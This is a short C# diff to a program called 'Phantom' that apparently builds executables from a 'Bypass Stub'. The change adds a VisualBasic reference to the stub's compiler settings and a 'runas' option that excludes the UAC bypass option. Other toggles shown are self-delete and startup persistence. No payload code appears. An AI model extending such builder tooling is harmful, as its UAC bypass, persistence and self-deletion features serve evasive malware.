@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.CodeDom.Compiler;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -317,7 +317,7 @@ namespace Phantom
             CSharpCodeProvider csc2 = new CSharpCodeProvider();
 
             // Specify compiler parameters for second compilation (Bypass Stub)
-            CompilerParameters parameters2 = new CompilerParameters(new[] { @"mscorlib.dll", @"System.Core.dll", @"System.dll", @"System.Management.dll" }, tempfile)
+            CompilerParameters parameters2 = new CompilerParameters(new[] { @"mscorlib.dll", @"System.Core.dll", @"System.dll", @"System.Management.dll", @"Microsoft.VisualBasic.dll" }, tempfile)
             {
                 GenerateExecutable = true,
                 CompilerOptions = @"-optimize -unsafe",
@@ -514,6 +514,10 @@ namespace Phantom
         {
             if (uacBypass.Checked)
             {
+                if (runas.Checked)
+                {
+                    runas.Checked = false;
+                }
                 selfDelete.Checked = false;
                 selfDelete.Enabled = false;
             }
@@ -522,6 +526,17 @@ namespace Phantom
                 if (!startup.Checked)
                 {
                     selfDelete.Enabled = true;
+                }
+            }
+        }
+
+        private void runas_CheckedChanged(object sender, EventArgs e)
+        {
+            if (runas.Checked)
+            {
+                if (uacBypass.Checked)
+                {
+                    uacBypass.Checked = false;
                 }
             }
         }
